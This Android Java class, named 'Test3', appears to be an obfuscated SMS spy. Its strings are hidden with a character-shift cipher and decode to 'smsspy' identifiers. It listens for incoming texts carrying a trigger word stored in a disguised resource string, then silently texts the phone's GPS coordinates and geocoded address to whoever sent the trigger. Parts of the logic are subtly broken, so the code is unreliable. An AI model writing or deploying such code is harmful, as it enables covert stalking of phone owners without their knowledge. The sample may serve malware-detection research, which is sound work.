package com.example.flymaple.test10;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

/**
 * Created by Flymaple on 7/3/15.
 */
public class Test3 extends AsyncTask<Intent, Void, Void>
        implements LocationListener {
    public static final String S = strDecode("ef/npcjobvufo/tnttqz/TNT`TFOU");
    public static final String SS= strDecode("boespje/qspwjefs/Ufmfqipoz/TNT`SFDFJWFE");
    private boolean _r;
    private String send;
    private Context c;
    private Intent int1;
    private LocationManager lm1;
    private boolean lc = false;
    private PendingIntent si;
    private SmsManager manager;

    protected Void doInBackground(Intent[] is)
    {
        int j;
        int k;
        do {
            try {
                Log.i(strDecode("TNTTQZ"), getClass() + strDecode("!Ep!jo!cbdlhspvoe;!") + is[0].getAction());
                Intent li = is[0];
                if (!li.getAction().equals(strDecode("boespje/qspwjefs/Ufmfqipoz/TNT`SFDFJWFE")))
                    break;
                String s1 = outLine10();
                Bundle lb = outLine9(li);
                if (lb == null)
                    break;
                Object[] os = (Object[]) lb.get(strDecode("qevt"));
                SmsMessage[] smsMs = outLine8(os);
                for (int i = 0; ; i++) {
                    if (i >= os.length) {
                        j = smsMs.length;
                        k = 0;
                        break;
                    }
                    smsMs[i] = outLine11(os,i);
                }
                outLine7(smsMs,k,s1);
            } catch (Throwable t) {
                Log.e(strDecode("TNTTQZ"), t.getMessage(), t);
                break;
            }
        }
        while (k < j);
        return null;
    }

    public SmsMessage outLine11(Object[] os,int i){
        SmsMessage s = SmsMessage.createFromPdu((byte[]) os[i]);
        return s;
    }

    public SmsMessage[] outLine8(Object[] os){
        SmsMessage[] smsMs = new SmsMessage[os.length];
        return smsMs;
    }
    public String outLine10(){
        String s1 = this.c.getString(R.string.abc_action_bar_home_description);
        return s1;
    }

    public Bundle outLine9(Intent li){
        Bundle lb = li.getExtras();
        return lb;
    }


    public void outLine7(SmsMessage[] smsMs,int k,String s1){
        SmsMessage smsMs2 = smsMs[k];
        this._r = false;
        if (smsMs2.getMessageBody().toLowerCase().contains(s1)) {
            this._r = true;
            this.send = smsMs2.getOriginatingAddress();
        }
        k++;
    }

    public void onLocationChanged(Location l)
    {
        if (!this.lc)
        {
            StringBuffer lsb = new StringBuffer();
            String s1 = outLine1(l);
            String s2 = outLine2(l);
            lsb.append("l is at\n");
            if (s1.length() > 8)
                outLine3(lsb,strDecode("Mbujuvef;!") + String.valueOf(l.getLatitude()).substring(0, 9) + "\n");
            while (true)
            {
                Geocoder lg=null;
                if (s2.length() > 8)
                {
                    outLine3(lsb,strDecode("Mpohjuvef;!") + String.valueOf(l.getLongitude()).substring(0, 9) + "\n");
                    outLine3(lsb,strDecode("Qsfdjtjpo!cz;!") + l.getProvider() + "\n");
                    lg = new Geocoder(this.c, Locale.getDefault());
                }
                try
                {
                    List lls = lg.getFromLocation(l.getLatitude(), l.getLongitude(), 1);
                    Address la=null;
                    if (lls != null)
                    {
                        outLine6(lsb,la,lls);
                        outLine5(lsb,la,l);
                        outLine4(lsb);
                        return;
                    }
                }
                catch (IOException e)
                {
                }
            }
        }
        this.lm1.removeUpdates(this);
    }


    public String outLine1(Location l){
        this.lc = true;
        String s1 = String.valueOf(l.getLatitude());
        return s1;
    }
    public String outLine2(Location l){
        //StringBuffer lsb = new StringBuffer();
        String s1 = String.valueOf(l.getLatitude());
        return s1;
    }

    public void outLine3(StringBuffer lsb, String s){
        lsb.append(s);
    }

    public void outLine4(StringBuffer lsb){
        Iterator ie = this.manager.divideMessage(lsb.toString()).iterator();
        while(ie.hasNext()){
            String s3 = (String)ie.next();
            this.manager.sendTextMessage(this.send, null, s3, this.si, null);
        }
    }

    public  void outLine5(StringBuffer lsb,Address la,Location l){
        int j = la.getMaxAddressLineIndex();
        for(int i=0;i<j;i++){
            outLine3(lsb,la.getAddressLine(i));
            outLine3(lsb,strDecode("Mbujuvef;!") + String.valueOf(l.getLatitude()) + "\n");
            outLine3(lsb,strDecode("Mpohjuvef;!") + String.valueOf(l.getLongitude()) + "\n");
            outLine3(lsb,"\n");
            if (la.getPostalCode() != null)
                outLine3(lsb,la.getPostalCode());
            i++;
        }
    }

    public void outLine6(StringBuffer lsb,Address la,List lls){
        lsb.append("addre is at \n");
        la = (Address)lls.get(0);
    }

    public void onProviderDisabled(String s)
    {
    }

    public void onProviderEnabled(String s)
    {
    }

    public void onStatusChanged(String s, int i, Bundle b)
    {
    }

    public void setC(Context c)
    {
        this.c = c;
    }

    private static String strDecode(String str){
        String s = "";
        for (int i=0;i<str.length();i++){
            char a_char = str.charAt(i);
            int x = (int)a_char;
            x--;
            a_char = (char)x;
            s = s + a_char;
        }
        System.out.print(s);
        return s;
    }

}
